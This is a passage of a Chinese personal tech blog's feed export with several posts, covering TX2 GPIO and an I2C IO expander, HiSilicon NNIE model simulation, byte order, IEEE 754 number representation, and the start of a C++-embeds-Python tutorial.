        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>DL</category>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>NNIE</tag>
        <tag>3516CV500</tag>
      </tags>
  </entry>
  <entry>
    <title>TX2 核心板 GPIO、IO扩展器、拨码开关、LED灯 使用总结</title>
    <url>/2019/08/24/blog_idx_087/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
起因

  我们有个项目，做了一个基于TX2核心板的硬件板卡，这个板卡除了做相关算法的检测之外，还得提供一些控制LED啊、通过拨码开关这些来设置一些内容的小功能，你说气不气，这些小功能还必须要实现。如果LED和拨码开关直接挂载到tx2的gpio上的话，就没有必要写本文了，没意义，因为只要学过嵌入式的人，给他一个板子，再差劲，读取和设置一个gpio的高低电平总会吧。如果不会，建议还多学学嵌入式基础知识(从单片机玩起来，先裸奔，再上OS)。
  这里我们知道，其实对于芯片来说，引脚是非常珍贵的，如果芯片所需要实现的功能复杂，那么通用的io管脚异常珍贵，这里就出现了一个种器件，叫做IO扩展器（所实话，我都不知道这样翻译对不对），从名字可知，就是较少的引脚扩展出更多的引脚，本文就是用两个引脚扩展出了16个引脚。
  TX2上,由于使用了Linux，读取和设置gpio也是非常简单的，直接打开相关的gpio设备，读写即可。不要问我为啥要用linux，不用其他os，或者直接裸机控制，我只能够回答曰：我是想啊，可是我实力不允许啊，什么caffe、opencv、ncnn、cuda等等堆到其他系统或者裸机下，我着实能力不够，弄不过去，关键还麻烦。




IO扩展器



IO扩展器原理简介
  其实本文的核心就是IO扩展器，这个器件由于我玩的板子少，见识少，我是第一次见到这种器件。下图就是这种器件在tx2手册里面的推荐使用方法。

    
        
    
    
  这种器件就是通过某种总线，然后扩展出尽可能多的io口。这里的这个器件通过I2C总线，扩展出16个io口。
  这里我们可以看到：SCL和SDA是I2C通信总线，A0和A1是可编程配置I2C从器件地址。（这里不懂也没关系，就是这个器件的地址可以编程设置，至于为啥要有这个地址，可以简单理解为一个总线挂载多个设备，某一时刻总线只能为其中一个设备提供服务，这些设备的区分就是通过地址来完成的。）
  P00-P17是扩展出来的IO口。
  知道以上足够了，没学过的也足够了。
  这个器件的特性是：通过I2C协议操作他的寄存器，他有8个8位寄存器，0-1寄存器是INPUT用，2-3寄存器是OUTPUT用，4-5好像是优先级裁决，6-7是配置寄存器，就是配置IO口是输出还是输入，如果接触过单片机、stm32这种的GPIO程序的话，是很好理解的。（手动滑稽，我出了校门就没接触过了）
  不要问下图的是什么器件（问就是不知道，手动滑稽），这只是举个例子，这个io扩展器的寄存器分配以及功能就是这样的。

    
        
    
   

    
        
    
 


IO扩展器编程操作—shell command
  首先这个器件是通过I2C协议操作的，不用关心I2C是什么，他们你可以类比为HTTP。那么Linux上怎么通过I2C操作这个器件呢？
  首先，Linux上有一组工具：i2c-tool，它可以读取所有芯片的i2c bus上挂载的芯片，设置和读取寄存器等等，拿来做测试或者封装一个程序都是不错的。TX2的ubuntu16.04是自带这个工具的，他的详细用法大家去百度，我不造轮子了。
  在Ubuntu里面操作I2C是非常简单的，你不需要关心I2C的具体传输规定，不用管时序这些烦人的事情。
  首先我们先用工具来测试，美滋滋：
  还记得上文我提了这个IO扩展器的从地址的事情吗？由于我的A0和A1都是接的低电平，在这里我的器件地址是0x74，怎么来的，看下图。

    
        
    
 
  然后通过i2cdetect查看我们器件的位置（0x74）（注意，这个命令需要传入一个I2C总线序号，我这里是0，也就是说你要知道你这个IO扩展器挂载到哪个总线上的，这和SCL和SDL接线有关，有兴趣的可以去翻一翻手册就知道了，UU代表有人在占用这个设备）
  shell:&gt;i2cdetect -y -r -a 0

    
        
    
 
  i2cdump可以通过标准i2c协议探测出所有的寄存器的值，下图8个寄存器的值就的出来了，分别对应上面的寄存器说明。XX代表没有这个寄存器。
  shell:&gt;i2cdump -f -y  0 0x74

    
        
    

  然后：


i2cset -f -y i2c_bus_num slave_addr reg_num value 设置寄存器值


i2cget -f -y i2c_bus_num slave_addr reg_num 获取寄存器值


  其实通过上面的操作就可以完成整个io扩展器的操作，我们可以通过程序执行shell命令的方式设置和操作值。


IO扩展器编程操作—syscall
  实际上，linux做了很多东西，我们可以用标准的linux sys-api来完成以上内容，其实这些api就是i2ctool使用的部分。
  下面不墨迹，直接给出led操作的接口，有需要的参考吧。
int open_led_device(const char * i2c_bus_num, int slave_addr)&#123;

    int fd = 0; 

    if ( 0 > (fd = open(i2c_bus_num, O_RDWR)) )&#123;//打开i2c总线

        perror("open i2c bus error:");
        return -1;
    &#125;

    if(ioctl(fd, I2C_SLAVE_FORCE, DEVICE_I2C_ADDR) &lt; 0) &#123;//设置从器件地址，这里使用I2C_SLAVE_FORCE进行强行设置，那么这个设备忙

        perror("set device slave addr error:"); 
        return -1; 
    &#125;

    if ( 0 > write_led_register(fd, LED_REG1_CFG_ADDR, LED_REG1_CFG_VAL) )&#123;//设置写寄存器值，这两个宏和你的硬件连线有关。这里不给出。

        printf("init pin for output-mode failed.\n");
        close(fd);
        return -1;
    &#125;

    return fd;

&#125;

int read_led_register(int fd, char reg_addr, char *read_val)&#123;//读寄存器

    if (write(fd, &amp;reg_addr, 1) != 1)&#123;//write reg addr ,从器件地址通过open接口设置好后，先写入要读的reg地址

        perror("set reg addr error:"); 
        return -1; 
    &#125;

    if ( read(fd, read_val, 1) != 1 )&#123;//read data，等待i2c返回刚刚要查询的reg值

        perror("read reg error:"); 
        return -1; 
    &#125;
    return 0;
&#125;

int write_led_register(int fd, char reg_addr, char data)&#123;//写寄存器

    char tmp_buf[2];


    tmp_buf[0] =  reg_addr;//reg 地址
    tmp_buf[1] = data;//reg 值


    if (write(fd, tmp_buf, 2) != 2)&#123;//write data

        perror("write data error:"); 
        return -1; 
    &#125;

    return 0;
&#125;

void close_led_device(int fd)&#123;//关闭

    close(fd);
&#125;




LED灯

  此处省略XXX字。
  相信每个人都知道，常规情况下，在LED灯的两边加电源正极和负极，灯就能亮。在电路设计上，一般来说，LED灯的一端都是和电源正极或者负极是连接好的，另一端和GPIO口接上。如果GPIO输出的电压和另一端电压逻辑一致（比如都是高电平、都是低电平），灯就不亮，反之就亮。
  注意：这段话是有毛病的，但是一般人这样理解就行了（不了解电子电路的就看到这就行了）。对于懂的人，这里多说一句，这里还有一个三极管做开关作用，也是就说LED灯两端都接在电源正负极，中间有个三极管开关。




拨码开关

  这种器件，又是另外一种新奇的东西了，感觉我这两年写的“祖传屎山“太多了，现在看到各种硬件器件都是眼前一亮的感觉。
  就是类似下图这种。

    
        
    


    
        
    

  其作用是：
  你可以人为的按这个±号按钮，设置数字，这个数字会反应到电路上，从而芯片可以读取你设置的数字。说白了，你的系统中有个数字参数，你可以通过这种器件进行手动设置，通过驱动程序，就可以更改这个系统参数，是不是 so 简单。
  这里简单说明一下电路是怎么反应出对应的数字的：
  我就举个栗子，下图是个例子拨码开关（手动滑稽，这里多说一句，上图的拨码开关，是4个拨码开关合在一起的，下图的这个输出编码是一个拨码开关的）

    
        
    

  这里可以简单理解为：
  一个拨码开关有5个引脚，一个引脚是C，接GND或者VCC，其他4个是编码引脚，是需要接GPIO，并去取编码的。
  其实很简单：
  例如：C端我接VCC，1248默认值为0，那么数字1，1号引脚接通，那么8421io口输出二进制就是0001，转换为10进制，就是1.
  然后写个程序读取这4个脚的值，转换一下，就OK。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>常识</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>TX2</tag>
        <tag>GPIO</tag>
      </tags>
  </entry>
  <entry>
    <title>HiSi 3516CV500 NNIE(Neural Network Inference Engine) 摸鱼记录(2) --- 模型生成及模型仿真(实例分析)</title>
    <url>/2019/06/08/blog_idx_085/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
背景

  本文建立在上文环境配置的基础上继续。(上文链接：https://blog.csdn.net/u011728480/article/details/91125581)
  本文将会以一个实例来进行分析。同时本文的教程都是建立在《HiSVP 开发指南.pdf》基础上的。




NNIE 模型生成



NNIE 新建工程
  File 新建NNIE工程，选择MinGW GCC 空工程即可。

    
        
    
    


NNIE Mapper 配置文件建立
  File 新建nnie mapper配置文件，如下图：

    
        
    
    
  双击这个mapper文件，你可以进入配置页面，如下图，其相关的参数和选项要按照《HiSVP 开发指南.pdf》的NNIE mapper配置文件参数详解。

    
        
    
    
  这里有几个地方要注意一下：


is_simulation 是生成功能仿真或者指令仿真模型。指令仿真模型就是最终到板子上的模型。


batch_num 对于forward来说，一般都是一张图像，这里选1就行了。


sparse_rate 先0不影响正常输出。


data_type 这里你一定要去看文档说明，弄清楚你的网络需要输入的是什么数据类型，有些在网络里面做了归一化，这里选U8，如果网络前面做归一化，这里就要选S32，其他类型，看文档。




NNIE 模型生成
  在把NNIE Mapper配置配好了后，点击如下图的按钮即可生成对应的wk文件。

    
        
    
    
  我这里就根据is_simulation生成了两种模型，功能仿真模型输出内容多。指令仿真模型输出基本保持和板子上是一致的。

    
        
    
    


NNIE 模型仿真工程搭建
  这里，我们就不要做重复造轮子的工作，直接导入官方sample_simulator，然后在其基础上魔改就行了。

    
        
    
    


魔改切入点
  在src目录，打开main.cpp，简单分析一波，根据我的网络特点，直接选择分类网络例子(svpsampleclassification.cpp)，复制为我的cpp和hpp。

    
        
    
  
  其核心调用在仿真里面就两个函数:


HI_MPI_SVP_NNIE_Forward  网络forward


HI_MPI_SVP_NNIE_Query forward状态查询


  其余的都是在准备数据和查看数据。这里你可以参考svpsampleclassification.cpp进行简化魔改即可。
  需要注意的是：HI_MPI_SVP_NNIE_Forward  的api参考文档中，有关于输入和输出数据的规格说明，别弄错了。
  魔改好了，直接打印出最后一层的输出。


每一层的数据保存
  这种方法适用于后续的向量对比，用于查看你生成的模型对不对。在sim_out的目录下有一个nnie_sim.ini配置文件，里面可以设置一些不错的参数。

    
        
    
  
  双击后，可以界面设置：

    
        
    
  
  这里必须勾上第一个，第二个建议勾上，这样跑的快点。第一个勾上后，会输出每一层的输出。
  然后运行你魔改的程序，在sim_out下会出现如下图的内容（我这里我两种模型的仿真都做过了，所以有两种每一层网络的输出）：

    
        
    
  




网络标准输出

  点这个，配置参数，然后输出你的caffe模型的每一层数据，用作后续的向量分析。

    
        
    
  

    
        
    
  
  这里没什么注意的，自己配置好相关的内容即可。
  这里执行后会在output dir 输出每一层caffe模型的forward输出
  如下图：

    
        
    
  




向量对比

  向量对比有什么作用，相比经常接触这方面的人会有感受，就是指你的模型输出对不对。比如：caffe 的输出，nnie的输出到底能否对上，hisi提供了这样的一个工具。

    
        
    
  
  一个选择caffe输出，一个选择仿真输出。对比即可。双击可以查看每一层的所有输出数据，这里我就直接看最后一层。

    
        
    
  

    
        
    
  
  从最后一层的数据对比来看，基本偏差不大，因为后续还要继续对数据进行处理。这样的话，就证明了我的nnie模型至少现在看来没什么问题了。




后记

  注意事项
  如果你的输出和标准caffe输出差的非常远，有70%的可能性是你输入数据不一致导致的，你要和算法他们详细沟通，并打印输入数据，经过实际对比，看看哪里有什么问题。
  不一致的原因很多，一般来说就是图像通道对不上，预处理不一致等等。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>DL</category>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>NNIE</tag>
        <tag>3516CV500</tag>
      </tags>
  </entry>
  <entry>
    <title>大端(big endian) 小端(little endian) --- 在多字节存储 和 多字节通信中的含义（我还是太年轻了）</title>
    <url>/2019/11/04/blog_idx_089/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
背景

  出来工作了两年有余了，其中有很多次接触到大小端的问题，每次都是拍一下脑袋，按照记忆中的内容做东西。（小端：高地址存高字节，低地址存低字节；大端：高地址存低字节，低地址存高字节）没有做深入的理解，导致我最近遇到一个通信接口文档，文档标注的是大端模式，但是我按照自己的记忆中的大端去做，却写错了，这不是我记忆有问题，只是我没有理解到位而已。




Big endian And Little endian(大小端)

  在多个字节读写或者传输过程中，哪个字节作为高字节，哪个字节作为低字节，需要我们人为定义的。于是人们定义了大端模式和小端模式。但是我们常见的一句话：“小端：高地址存高字节，低地址存低字节；大端：高地址存低字节，低地址存高字节。”是指的多字节存储中的定义。对于多字节传输中，大端小端这样记忆或者说理解可能会出问题。
#include &lt;iostream>
#include &lt;iomanip>
#include &lt;cstdint>

union test_byte_order&#123;

	uint16_t a;
	uint8_t b;
&#125;test0;

int main(int argc, char * argv[])&#123;

	test0.a = 0xAAFF;
	
	//byte-order-check based on union 
	//Notice that the basefield flag only affects the insertion/extraction of integer values (floating-point values are always interpreted in decimal base).
	std::cout&lt;&lt;"addr of test0.a is "&lt;&lt;std::hex &lt;&lt; (uint64_t)&amp;test0.a &lt;&lt;std::endl;
	std::string union_ret = (test0.b == 0xFF)?"little endian":"big endian";
	std::cout&lt;&lt;union_ret&lt;&lt;std::endl;


	//byte-order-check based on pointer 
	uint16_t a = 0xAAFF;
	uint8_t * b = (uint8_t *)&amp;a;
	std::cout&lt;&lt;"addr of a is "&lt;&lt;std::hex &lt;&lt; (uint64_t)&amp;a &lt;&lt;std::endl;
	std::string pointer_ret = (*b == 0xFF)?"little endian":"big endian";
        std::cout&lt;&lt;pointer_ret&lt;&lt;std::endl;

	return 0;
&#125;
  gdb调试结果（符合预期）

    
        
    
 
  常见的x86 是小端模式
  现在常见的arm 支持大小端模式


多字节通信（人为约定）
  多字节通信的问题的话，其实就是你是先发送高字节，还是先发送低字节位的问题。其实如果通信文档中一般都定义了先发送高还是低字节，但是如果通信文档中换一种说法（大端模式、小端模式）的话，可能就需要思考一下，或者说需要理解一下才行。
  例如tcp/ip协议中，对于ip地址和端口号，要求的必须是网络字节序，也就是大端字节序模式。那我们到底是先发送高字节还是先发送低字节呢？其实在其他的232/485/can/蓝牙/等等通信方式中，也有同样的概念。
  那对于多字节通信中，人为定义了（注意，这里的定义的概念和多字节存储中的是同等级的，你可以理解为他们两个没有关系）：


大端序模式：先发送高字节，后发送低字节。


小端序模式：先发送低字节，后发送高字节。


  既然上述概念是大多数人为约定的，那么可能就有这样那样的误解。所以，一般通信文档上说明了大端模式、还是小端模式外，还需要标注MSB or LSB first，或者直接注明先发高或者是低字节，避免双方出现误解。
  当然，有没有方法可以记忆多字节通信中，这种大多数人定义的概念呢？下文提供了一种我的记忆方案吧。
//x86-64 ubuntu 18.04
uint16_t ttt = 0xAABB;
uint16_t ttt_hton = htons(ttt);//把ttt转换为网络字节序，大端模式
uint8_t array[4] = &#123;0xAA, 0xBB, 0xCC, 0xDD&#125;;

    
        
    
 

    
        
    
 
  在c&amp;&amp;c++数组中，数组名字是指向的这个数组的低地址。假如我要按地址自增方向发送这个数组的数据，如果数组中先存放高字节（也就是说低地址存放高字节，或者说先发送高字节），那么这种通信方案中，字节序为大端模式。小端模式同理可得。
  但是，这仅仅是一种记忆方案。而且这是一种通用的约定，具体还是要看通信文档的定义，例如tcp/ip中的ip和端口号字节序定义就是MSB first。如果某一天，哪个人可能直接定义大端模式就是先发送低字节，也是有可能的。




后记

  总结
  大小端对于存储和通信来说，我个人认为有着不同的含义。虽然可以通过一些方法联系起来记忆。
  但是我认为，以上的内容都不是重点，是一些概念的东西，重点的是，你要明白为啥会出现这个大小端的问题？什么是字节序？为什么会有字节序这个概念就行了？
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>C&amp;CPP</category>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>字节序</tag>
        <tag>大端</tag>
        <tag>小端</tag>
      </tags>
  </entry>
  <entry>
    <title>数与计算机 （编码、原码、反码、补码、移码、IEEE 754、定点数、浮点数）</title>
    <url>/2019/09/02/blog_idx_088/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  ubuntu 18.04
  Linux 4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
起因

  有些时候，在测试深度学习的模型的时候，特别是模型出问题，或者其他乱七八糟的原因，你会发现某些层的某些特征会出现INF和NAN(特别是转换模型)。说实话，这两个一个是无穷大，一个是不是数字，我们都知道这个的意思，但是怎么出现的，可能都忘了。
  我如果没有记错的话，数在计算机中的表示是来至于《计算机组成原理》，其中介绍了很多很多的有趣的原理。但是我出校后，这些理论知识很少和实际联系起来，趁着这次机会，我准备结合我们平常写的代码，理一理计算机中数的这个问题。




符号

  在计算机里面，除了指令，就是数值或者符号（统一的说就是数值，因为数值和符号有映射关系，这就是符号编码），我也不知道这样说对不对。
  本文主要是说的是数值。对于符号来说，符号涉及到编码问题，有兴趣的可以去了解了解，我们常见的编码就是ascii，utf-8, unicode，gbk，big5等等，这些编码涉及到符号显示的问题。




数值

  数值大致有两类表示法，一类是定点数，一类是浮点数。
  计算机中，对于整数来说，就是定点数表示法（这里对于整数的说法我也不太确定对不对，相关资料也没有查到明确的说法，但是我理解的是整数就是定点数表示法中，小数点在最右边），对于实数来说，就是浮点数表示法。


整数
  在计算机中，在说明整数的定点数表示之前，还得说几个书上的理论：


原码：原码就是十进制转换为二进制。


反码：原码取反。


补码：反码+1。（注意：如果是符号数，反码和补码运算不影响符号位。）


  在计算机中，正整数的补码反码原码一样，负整数的补码是原码取反加1。
  对于整数来说，可以分为有符号还是无符号的整数。
  无符号数，是正整数，所以在计算机中是补码表示，且就是其十进制转换为二进制。
  有符号整数，如果是正整数，计算机中补码表示，且就是其十进制转换为二进制（补码原码一样），如果是负整数，在计算机中表示，且就是其十进制转换为二进制，取补码。


实数
  在计算机中，在说明浮点数表示法之前，还得说两个理论：移码：N-M转换为二进制，M为偏移数。
  二进制浮点数：整数部分直接转换为二进制（除2逆序取余），小数部分逼近求和（乘2正序取整）。（更详细的百度随便找个教程即可，我这里只是简单写一下）
  规范化二进制浮点数：小数点前只有一个1。
  IEEE 754：IEEE根据一些历史因素，定制的大部分通用的浮点数表示方法。以单精度浮点数为例，31位表示符号位，23-30位表示exponent（偏移数是M，指数为E.），0-22表示base(底数为B)，表示的浮点数为：B*(2^(E-M))
  IEEE 754有很多特殊值，也有一些溢出规则和约等于规则，一般来说，除非你要做科学运算，平常你是遇不到的，简单了解一下即可。
  IEEE 754规定的特殊值：

    
        
    
    

    
        
    
 
  注意：其实浮点数还有其他的一些异常计算及表示，详细的请查看ieee 754 chapter7




实例分析

  上面扯了半天，大家都看烦了，其实都是一些书本上的知识整理。
  下面是实例源文件。
#include &lt;cstring>
int main(int argc , char * argv[])&#123;

//integer
	char A = 0xF1;//A = -15; size(A) = 1;mem=[1]111 0001(complement); mem=[1]000 1111(true form)
	short B = 0xF111;//B= -3823; size(B) = 2; mem = [1]111 0001 / 0001 0001 (complement); mem=[1]000 1110 / 1110 1111(true form)
	int C = 0xF1111111;//C = -250539759; size(C) = 4; mem = [1]111 0001 / 0001 0001 / 0001 0001 / 0001 0001 (complement); mem=[1]000 1110 / 1110 1110 / 1110 1110 / 1110 1111 (true form)
	long D = 0xF1111111;//D = -250539759(size(D)=4), 4044427537(size(D)=8); size(D) = 4; mem = [1]111 0001 / 0001 0001 / 0001 0001 / 0001 0001 (complement); mem=[1]000 1110 / 1110 1110 / 1110 1110 / 1110 1111 (true form)(Sizeof(D) may be 4 or 8, it decided by compiler)
	long long E = 0xF111111111111111;//E = -1076060070966390511; size(E) = 8; mem = [1]111 0001 / 0001 0001 / 0001 0001 / 0001 0001 / 0001 0001 / 0001 0001 / 0001 0001 / 0001 0001 (complement); mem=[1]000 1110 / 1110 1110 / 1110 1110 / 1110 1110 / 1110 1110 / 1110 1110 / 1110 1110 / 1110 1111 (true form)

	//overflow int
	int C1 = 0xF1111111FF;//drop highest byte(0xF1), it decided by compiler

	//overflow long long
	long long E1 = 0xF111111111111111FF;//drop highest byte(0xF1), it decided by compiler



//float, IEEE 754.
/*	
single-precision float
bits: [31] is signed bit, (30~23) is exponent, &#123;22~0&#125; is base

double-precision float
bits: [63] is signed bit, (62~52) is exponent, &#123;51~0&#125; is base
*/
	float F = -10;//size(F)=4, mem=[1](100 0001 / 0)&#123;010 0000 / 0000 0000 / 0000 0000&#125;, [] is signed bit. () is exponent, &#123;&#125; is normalized base.(single-precision)
	double G = 10;//size(G)=8, mem=[0](100 0000 / 0010) &#123;0100 / 0000 0000 / 0000 0000 / 0000 0000 / 0000 0000 / 0000 0000 / 0000 0000&#125;, [] is signed bit. () is exponent, &#123;&#125; is normalized base.(double-precision)

	int tmp_buf = 0x00800001;
	float F_normalized_min = 0;
	memcpy(&amp;F_normalized_min, &amp;tmp_buf, sizeof(F_normalized_min));//size(F)=4
	float F_normalized_zero = F_normalized_min - 1; //-1


	float F_normalized_max = 0;
	tmp_buf = 0x7F7FFFFF;
	memcpy(&amp;F_normalized_max, &amp;tmp_buf, sizeof(F_normalized_max));//size(F)=4
	float F_normalized_infinity = F_normalized_max * F_normalized_max; //inf
	
	float F_normalized_nan = F_normalized_infinity / F_normalized_infinity;//nan

	//some fun value
	float F_fun_01 = 0.1;
	float F_fun_02 = 0.2;
	float F_fun_03 = 0.3;
	float F_fun_04 = 0.4;
	float F_fun_05 = 0.5;
	float F_fun_06 = 0.6;
	float F_fun_07 = 0.7;
	float F_fun_08 = 0.8;
	float F_fun_09 = 0.9;

	float F_denormalized_min = 0;
	tmp_buf = 0x00000001;
	memcpy(&amp;F_denormalized_min, &amp;tmp_buf, sizeof(F_denormalized_min));//size(F)=4
	float F_denormalized_max = 0;
	tmp_buf = 0x007FFFFF;
	memcpy(&amp;F_denormalized_max, &amp;tmp_buf, sizeof(F_denormalized_max));//size(F)=4




	return 0;
&#125;


整数分析
  有符号负整数：

    
        
    
    

    
        
    
    
（注意，x86，小端）
  无符号整数、有符号正整数，就是直接10进制转换为二进制。


浮点数分析
  规范化浮点数：（数值：规范化浮点数最小正数）

    
        
    
   

    
        
    
   
（数值：规范化浮点数最大正数）

    
        
    
  

    
        
    
  
（数值：非规范化浮点数最小正数）

    
        
    
  

    
        
    
  
（数值：非规范化浮点数最大正数）

    
        
    
  

    
        
    
  
浮点数异常计算：（数值：NAN）

    
        
    
  

    
        
    
  
（数值：INF）

    
        
    
  

    
        
    
  




一些有趣的浮点数

  看了上边后，计算机关于浮点数的的存储其实是很离散的（很不靠谱），也就是说，很多浮点数计算机根本表示不出来（计算机只能够存储，实数数轴上极少部分的数），为什么呢？如果你要是了解了上面关于10进制浮点数转2进制浮点数，那么你可能已经猜到了原因。

    
        
    
  

    
        
    
  
  下面我以0.1位例，分析一下，为啥会出现这样的问题。

    
        
    
  
  0.1在计算机中表示为：
mem&#x3D;[0](011 1101&#x2F; 1)&#123;100 1100&#x2F; 1100 1100&#x2F; 1100 1100&#125;, [] is signed bit. () is exponent, &#123;&#125; is normalized base.(single-precision)

E&#x3D;123
M&#x3D;127
B&#x3D;1.100 1100&#x2F; 1100 1100&#x2F; 1100 1100

F_fun_01 &#x3D; B*2(^-4) &#x3D; 0.0001100 1100&#x2F; 1100 1100&#x2F; 1100 1100 &#x3D; 2^(-4) + 2^(-5) + 2^(-8) + 2^(-9) + 2^(-12) + 2^(-13) + 2^(-16) + 2^(-17) + 2^(-20) + 2^(-21) + 2^(-24) + 2^(-25) 
  正是因为在内存中表示的是这样的，所以这里打印出来的值看到不是0.1，而是0.1+。那么大家可能会疑惑，如果0.1都有误差，那计算的时候，不是炸了吗？其实不然，还记得c语言中一句话吗？float的精度为小数点后6位，为啥是6位，而不是10位，8位呢？其实原因就是来至于这里，计算机中，某些小数位后虽然还有值，但是不是有效的，但是这些值影响数值的舍进（类似与四舍五入的约等于，建议大致了解，知道有这个事情即可）。




后记

  总结
  计算机里面，数的表示，就浮点数最难，但是只需要了解了大致的原理，你就会觉得非常简单。
  其实对于计算机来说，数值的表示很弱的，离表示整个数轴差的远。
  在计算机里面，数值有很多边界条件，比如溢出、异常运算、异常值，只是我们平常很少遇到，所以遗忘了。
  同时也可以说明，其实计算机仅仅是个机器，只会冰冷的加载指令和数，并执行，只是我们的前辈们为我们做了很多事情，隔离了很多细节和底层，让我们觉得这些东西可有可无，极大的便利人们使用计算机。这样有好处也有坏处。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>计算机编码</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ 调用 Python 总结(一)</title>
    <url>/2020/01/09/blog_idx_091/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  本文所有实例环境为：win10+py35
序

  我们有个任务，需要在C里面调用pycaffe的算法来做相关的检测。（不要问我为啥不直接用caffe的c接口，因为后面还要调tensorflow和pytorch，导致了算法组为了统(偷)一（懒），就直接怼了一个pycaffe）。
  我还是第一次遇到这类问题，我去查了查，还真的有相关的内容，真的是存在即合理。
  本文大部分内容都是主要参考python官方手册，其次也看了网络上的一些资料，我这里做了一些汇总和衍生。(官方手册https://docs.python.org/zh-cn/3/c-api/index.html)
  阅读本文需要一定的c++基本‘’姿势‘’和了解一些最最最简单的py‘’姿势‘’。




Python C Hello World

  先来一个全世界通用的例子。(没做异常处理)

#ifdef __cplusplus
extern "C"&#123;
#endif //
/*
Note Since Python may define some pre-processor definitions which affect the standard headers on some systems, you must include Python.h before any standard headers are included.
It is recommended to always define PY_SSIZE_T_CLEAN before including Python.h. See Parsing arguments and building values for a description of this macro.
*/
#define PY_SSIZE_T_CLEAN
#include &lt;Python.h>

#ifdef __cplusplus
&#125;
#endif //

#include &lt;iostream>
int main(int argc, char * argv[])&#123;

    //This function works like Py_Initialize() if initsigs is 1. 
    //If initsigs is 0, it skips initialization registration of signal handlers, which might be useful when Python is embedded.
    Py_InitializeEx(1);
    PyRun_SimpleString("print('hello world.')");
    Py_Finalize();
#ifdef _WIN32 || _WIN64

    system("pause");

#elif __linux__ || __linux


#endif //    
	return 0;
&#125;

  编译，设定python的头文件和库文件路径。（注意python的库名字），我这里是在win上做的演示，实际是部署到linux.相关结果如图：

    
        
    
    

    
        
    
   




Python C 常用接口



python 基本数据类型对象
  更加详细的，请查看官方doc中关于Py_BuildValue()接口的描述。
    PyObject * func_name = Py_BuildValue("s","test_add");
    PyObject * arg1 = Py_BuildValue("l",3);
```  

&lt;br/>
&lt;br/>

##### python 序列或者容器对象
&amp;emsp;&amp;emsp;更多内容，详见官方doc
```cpp
//tuple
PyObject* PyTuple_New(Py_ssize_t len)
//Return value: New reference.
//Return a new tuple object of size len, or NULL on failure.

PyObject* PyTuple_GetItem(PyObject *p, Py_ssize_t pos)
//Return value: Borrowed reference.
//Return the object at position pos in the tuple pointed to by p. If pos is out of bounds, return NULL and set an IndexError exception.

int PyTuple_SetItem(PyObject *p, Py_ssize_t pos, PyObject *o)
//Insert a reference to object o at position pos of the tuple pointed to by p. Return 0 on success. If pos is out of bounds, return -1 and set an IndexError exception.
//list
//原理同tuple
PyObject* PyList_New(Py_ssize_t len)
int PyList_SetItem(PyObject *list, Py_ssize_t index, PyObject *item)
PyObject* PyList_GetItem(PyObject *list, Py_ssize_t index)
//dict
//原理同tuple
PyObject* PyDict_New()
int PyDict_SetItem(PyObject *p, PyObject *key, PyObject *val)
PyObject* PyDict_GetItem(PyObject *p, PyObject *key)
  对于这些python中的数据类型对象，都有相关的c api来创建、操作，更多的内容可以查看官方doc。这部分内容较简单，不做示例。


python 模块对象
PyObject* PyImport_ImportModuleEx(const char *name, PyObject *globals, PyObject *locals, PyObject *fromlist)
/*
Return value: New reference.
Import a module. This is best described by referring to the built-in Python function __import__().

The return value is a new reference to the imported module or top-level package, or NULL with an exception set on failure. Like for __import__(), the return value when a submodule of a package was requested is normally the top-level package, unless a non-empty fromlist was given.

Failing imports remove incomplete module objects, like with PyImport_ImportModule().
*/
PyObject* PyModule_GetDict(PyObject *module)
/*
Return value: Borrowed reference.
Return the dictionary object that implements module's namespace; this object is the same as the __dict__ attribute of the module object. If module is not a module object (or a subtype of a module object), SystemError is raised and NULL is returned.

It is recommended extensions use other PyModule_*() and PyObject_*() functions rather than directly manipulate a module's __dict__.
*/

